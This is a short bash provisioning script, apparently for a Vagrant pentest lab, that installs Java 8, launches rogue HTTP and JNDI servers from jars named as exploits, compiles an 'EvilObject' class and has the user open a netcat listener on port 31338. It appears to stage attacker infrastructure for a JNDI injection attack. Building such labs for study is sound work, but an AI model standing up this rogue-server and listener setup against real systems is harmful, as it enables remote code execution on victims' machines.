#!/usr/bin/env bash

sudo apt-get update

# install java8
sudo apt-get -y install software-properties-common
sudo apt-get update
sudo apt-get install --yes python-software-properties
sudo add-apt-repository ppa:webupd8team/java
sudo apt-get update -qq
sudo echo debconf shared/accepted-oracle-license-v1-1 select true | /usr/bin/debconf-set-selections
sudo echo debconf shared/accepted-oracle-license-v1-1 seen true | /usr/bin/debconf-set-selections
sudo apt-get install --yes oracle-java8-installer
yes "" | apt-get -f install

# prepare endpoints
cp /vagrant/data/de.marko.pentest.rogue-1.0-HTTP-Exploit-all.jar /home/vagrant/
cp /vagrant/data/de.marko.pentest.rogue-1.0-JNDI-all.jar /home/vagrant/
cp -rv /vagrant/data/exploit/ /home/vagrant/

# run rogue point in background
java -jar de.marko.pentest.rogue-1.0-HTTP-Exploit-all.jar &
java -Djava.rmi.server.hostname=192.168.34.42 -jar de.marko.pentest.rogue-1.0-JNDI-all.jar &

# prepare exploit
mkdir exploit
javac -d exploit EvilObject.java
cd exploit/
javac EvilObject.java

# install stuff
sudo apt-get -y install netcat tmux
echo "=============================="
echo "type netcat -lkvp 31338 to start"
echo "=============================="
